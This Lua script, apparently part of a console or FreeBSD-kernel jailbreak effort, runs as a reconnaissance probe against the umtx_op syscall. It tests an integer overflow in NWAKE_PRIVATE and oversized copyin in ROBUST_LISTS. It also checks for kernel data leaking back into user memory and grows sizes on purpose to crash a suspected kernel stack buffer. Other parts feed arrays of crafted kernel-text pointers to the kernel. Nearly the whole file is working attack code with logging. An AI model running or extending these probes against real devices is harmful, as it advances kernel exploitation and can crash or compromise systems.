-- 14.10 Recon Probe 12: NWAKE_PRIVATE integer overflow + ROBUST_LISTS oversized copyin
-- Two non-race kernel bugs from probe 10:
-- 1) UMTX_OP_NWAKE_PRIVATE accepts count=INT_MAX (kernel reads count*8 from userland)
-- 2) UMTX_OP_ROBUST_LISTS accepts size=4096 (struct is only 24 bytes)

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: NWAKE + ROBUST DEEP DIVE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op = 557,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_getpid = 20,
})

local UMTX_OP_NWAKE_PRIVATE = 21
local UMTX_OP_ROBUST_LISTS  = 26
local UMTX_OP_WAIT_UINT_PRIVATE = 15
local UMTX_OP_WAKE_PRIVATE  = 16

-- ============================================================
-- PART 1: UMTX_OP_NWAKE_PRIVATE deep probe
-- The kernel does: copyin(uaddr, count * sizeof(void*))
-- If count * 8 overflows size_t, copyin gets a small buffer
-- but the kernel iterates 'count' times -> heap overflow read
-- ============================================================
log("")
log("--- PART 1: NWAKE_PRIVATE integer overflow ---")

-- First: confirm what counts succeed/fail
-- The kernel should validate count, but probe 10 showed INT_MAX works
local test_counts = {
    0, 1, 2, 4, 8, 16, 64, 256, 1024, 4096,
    16384, 65536, 262144, 1048576,
    0x10000000, 0x20000000, 0x40000000, 0x7FFFFFFF,
}

-- Allocate a large valid array of pointers
local array_size = 4096 * 8 -- 4096 pointers
local wake_array = memory.alloc(array_size + 4096)

-- Fill with valid (but unwaited) addresses
local dummy_addrs = {}
for i = 0, 255 do
    dummy_addrs[i] = memory.alloc(16)
    memory.write_dword(dummy_addrs[i], 0) -- nobody waiting
    memory.write_qword(wake_array + i * 8, dummy_addrs[i])
end
-- Fill rest with zeros
for i = 256, 4095 do
    memory.write_qword(wake_array + i * 8, 0)
end

log("  testing count values...")
for _, count in ipairs(test_counts) do
    local ok, err = pcall(function()
        return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, count, 0, 0, 0)
    end)
    local rv = "?"
    if ok then
        rv = tostring(err:tonumber())
    else
        rv = "ERR:" .. tostring(err):sub(1, 25)
    end
    log(string.format("  count=0x%08x (%10d): %s", count, count, rv))
end

-- Test: what if array points to unmapped memory?
-- If kernel doesn't validate, it'll fault on copyin
log("")
log("  testing with array at unmapped region...")
local unmapped = 0x7FF000000000 -- likely unmapped high userspace

local um_ok, um_err = pcall(function()
    return syscall.sc_umtx_op(unmapped, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  unmapped array, count=1: " .. (um_ok and tostring(um_err:tonumber()) or "ERR:" .. tostring(um_err):sub(1,30)))

local um2_ok, um2_err = pcall(function()
    return syscall.sc_umtx_op(unmapped, UMTX_OP_NWAKE_PRIVATE, 0x7FFFFFFF, 0, 0, 0)
end)
log("  unmapped array, count=MAX: " .. (um2_ok and tostring(um2_err:tonumber()) or "ERR:" .. tostring(um2_err):sub(1,30)))

-- Test: count that causes count*8 to overflow to a small value
-- 0x2000000000000001 * 8 = 8 (overflow), but count is int so max is 0x7FFFFFFF
-- 0x7FFFFFFF * 8 = 0x3FFFFFFF8 (4GB) — doesn't overflow on 64-bit
-- But if kernel uses int32 for the size: 0x7FFFFFFF * 8 = truncated
-- Let's check if the kernel uses a 32-bit multiply
log("")
log("  testing overflow boundary...")

-- 0x20000000 * 8 = 0x100000000 — overflows 32-bit to 0
local overflow_count = 0x20000000
local ov_ok, ov_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, overflow_count, 0, 0, 0)
end)
log(string.format("  count=0x20000000 (32-bit overflow to 0): %s",
    ov_ok and tostring(ov_err:tonumber()) or "ERR:" .. tostring(ov_err):sub(1,30)))

-- 0x20000001 * 8 = 0x100000008 — overflows to 8 (1 pointer)
local ov2 = 0x20000001
local ov2_ok, ov2_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, ov2, 0, 0, 0)
end)
log(string.format("  count=0x20000001 (overflows to 8): %s",
    ov2_ok and tostring(ov2_err:tonumber()) or "ERR:" .. tostring(ov2_err):sub(1,30)))

-- Timing test: does INT_MAX take noticeably longer?
-- If the kernel actually iterates INT_MAX times, it'll hang
log("")
log("  timing test (count=256 vs count=0x40000000)...")

-- Measure count=256
local t1_start = os.clock()
pcall(function()
    syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 256, 0, 0, 0)
end)
local t1_end = os.clock()
log(string.format("  count=256: %.4f sec", t1_end - t1_start))

-- Measure count=0x01000000 (16M)
local t2_start = os.clock()
pcall(function()
    syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 0x01000000, 0, 0, 0)
end)
local t2_end = os.clock()
log(string.format("  count=0x01000000 (16M): %.4f sec", t2_end - t2_start))

-- ============================================================
-- PART 2: UMTX_OP_ROBUST_LISTS oversized copyin
-- Kernel does copyin(uaddr, val) where val is the size arg.
-- Struct is 24 bytes but 4096 was accepted.
-- This means kernel reads 4096 bytes from userspace into a
-- kernel buffer — potential heap info leak on the way back,
-- or kernel stack overflow if the buffer is on the stack.
-- ============================================================
log("")
log("--- PART 2: ROBUST_LISTS oversized struct ---")

-- Test exact boundary: what sizes are accepted?
local test_sizes = {
    0, 1, 8, 16, 23, 24, 25, 32, 48, 64, 128, 256, 512,
    1024, 2048, 4096, 8192, 16384, 32768, 65536,
}

local robust_buf = memory.alloc(65536 + 4096)
-- Fill with a pattern so we can detect what gets read/written
for i = 0, 65535, 4 do
    memory.write_dword(robust_buf + i, 0x41414141)
end
-- Valid header
memory.write_qword(robust_buf, 24) -- size field
local dummy_list = memory.alloc(4096)
memory.write_qword(dummy_list, 0)
memory.write_qword(robust_buf + 8, dummy_list) -- robust_list_offset
memory.write_qword(robust_buf + 16, 0)         -- robust_inact_offset

log("  testing size values...")
for _, size in ipairs(test_sizes) do
    -- Reset size field to match what we're passing
    memory.write_qword(robust_buf, size)

    local ok, err = pcall(function()
        return syscall.sc_umtx_op(robust_buf, UMTX_OP_ROBUST_LISTS, size, 0, 0, 0)
    end)
    local rv = "?"
    if ok then
        rv = "OK (ret=" .. tostring(err:tonumber()) .. ")"
    else
        rv = "ERR:" .. tostring(err):sub(1, 30)
    end
    log(string.format("  size=%5d: %s", size, rv))
end

-- Now the key question: does the kernel WRITE BACK to our buffer?
-- If copyin reads 4096 bytes and then copyout writes back,
-- we might get kernel data leaked into our buffer.
log("")
log("  checking for kernel data leakback...")

-- Fill buffer with recognizable pattern
for i = 0, 4095, 4 do
    memory.write_dword(robust_buf + i, 0xDEADBEEF)
end
memory.write_qword(robust_buf, 4096) -- size
memory.write_qword(robust_buf + 8, dummy_list)
memory.write_qword(robust_buf + 16, 0)

-- Register with oversized struct
pcall(function()
    syscall.sc_umtx_op(robust_buf, UMTX_OP_ROBUST_LISTS, 4096, 0, 0, 0)
end)

-- Check if kernel modified our buffer beyond the 24-byte struct
local changed_offsets = {}
for i = 24, 4095, 4 do
    local val = memory.read_dword(robust_buf + i):tonumber()
    if val ~= 0xDEADBEEF then
        changed_offsets[#changed_offsets + 1] = {offset = i, value = val}
    end
end

if #changed_offsets > 0 then
    log("  *** KERNEL WROTE BACK " .. #changed_offsets .. " dwords beyond struct! ***")
    for _, c in ipairs(changed_offsets) do
        log(string.format("    +%d: 0x%08x (was 0xDEADBEEF)", c.offset, c.value))
    end
else
    log("  no modifications beyond struct (copyin only, no copyout)")
end

-- Check if the first 24 bytes were modified (kernel might normalize)
log("")
log("  first 24 bytes after register:")
for i = 0, 16, 8 do
    local lo = memory.read_dword(robust_buf + i):tonumber()
    local hi = memory.read_dword(robust_buf + i + 4):tonumber()
    log(string.format("    +%d: 0x%08x%08x", i, hi, lo))
end

-- Deregister
memory.write_qword(robust_buf, 24)
memory.write_qword(robust_buf + 8, 0)
memory.write_qword(robust_buf + 16, 0)
pcall(function()
    syscall.sc_umtx_op(robust_buf, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0)
end)

-- ============================================================
-- PART 3: ROBUST_LISTS kernel stack probe
-- If the kernel uses a stack buffer for copyin, we can overflow
-- it by passing a huge size. Try increasing sizes to find crash.
-- ============================================================
log("")
log("--- PART 3: ROBUST_LISTS stack overflow test ---")

-- Use progressively larger sizes, watching for crash
local stack_sizes = { 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536 }
local big_buf = memory.alloc(65536 + 4096)

for _, size in ipairs(stack_sizes) do
    -- Fill with pattern
    for i = 0, size - 1, 8 do
        if i + 8 <= size then
            memory.write_qword(big_buf + i, 0x4242424242424242)
        end
    end
    memory.write_qword(big_buf, size)
    memory.write_qword(big_buf + 8, dummy_list)
    memory.write_qword(big_buf + 16, 0)

    local ok, err = pcall(function()
        return syscall.sc_umtx_op(big_buf, UMTX_OP_ROBUST_LISTS, size, 0, 0, 0)
    end)
    local alive = pcall(function() return syscall.getpid():tonumber() end)
    log(string.format("  size=%5d: %s (alive=%s)", size,
        ok and "OK" or "ERR:" .. tostring(err):sub(1,20),
        tostring(alive)))

    -- Deregister after each test
    memory.write_qword(big_buf, 24)
    memory.write_qword(big_buf + 8, 0)
    memory.write_qword(big_buf + 16, 0)
    pcall(function() syscall.sc_umtx_op(big_buf, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0) end)
end

-- ============================================================
-- PART 4: NWAKE with crafted pointer array
-- If the kernel reads count pointers and tries to wake each one,
-- we can point some entries at interesting kernel-adjacent addresses
-- and observe behavior (error codes, timing differences)
-- ============================================================
log("")
log("--- PART 4: NWAKE crafted pointer array ---")

-- Test: array with NULL pointer
local craft_array = memory.alloc(4096)
memory.write_qword(craft_array, 0) -- NULL pointer
local null_ok, null_err = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  NULL pointer in array: " .. (null_ok and "OK" or "ERR:" .. tostring(null_err):sub(1,30)))

-- Test: array with near-NULL pointer (page 0)
memory.write_qword(craft_array, 4)
local low_ok = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  addr=4 in array: " .. (low_ok and "OK" or "FAIL"))

-- Test: array with high userspace address (near kernel boundary)
memory.write_qword(craft_array, 0x00007FFFFFFFFFFF) -- top of user space
local high_ok = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  addr=0x7FFFFFFFFFFF: " .. (high_ok and "OK" or "FAIL"))

-- Test: array with kernel-space address (should EFAULT)
memory.write_qword(craft_array, 0xFFFFFFFF80000000) -- kernel text
local kern_ok, kern_err = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  addr=kernel text: " .. (kern_ok and "OK(!)" or "ERR:" .. tostring(kern_err):sub(1,30)))

-- Test: mix of valid and kernel addresses
-- Does the kernel stop at first bad addr or continue?
local mixed = memory.alloc(256)
local valid_addr = memory.alloc(16)
memory.write_dword(valid_addr, 0)
memory.write_qword(mixed, valid_addr)             -- [0] valid
memory.write_qword(mixed + 8, 0xFFFFFFFF80000000) -- [1] kernel
memory.write_qword(mixed + 16, valid_addr)         -- [2] valid

local mix_ok, mix_err = pcall(function()
    return syscall.sc_umtx_op(mixed, UMTX_OP_NWAKE_PRIVATE, 3, 0, 0, 0)
end)
log("  mixed valid+kernel array: " .. (mix_ok and "OK" or "ERR:" .. tostring(mix_err):sub(1,30)))
if mix_ok then
    log("  *** kernel processes array past bad addresses! ***")
end

log("")
log("=== NWAKE + ROBUST DEEP DIVE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
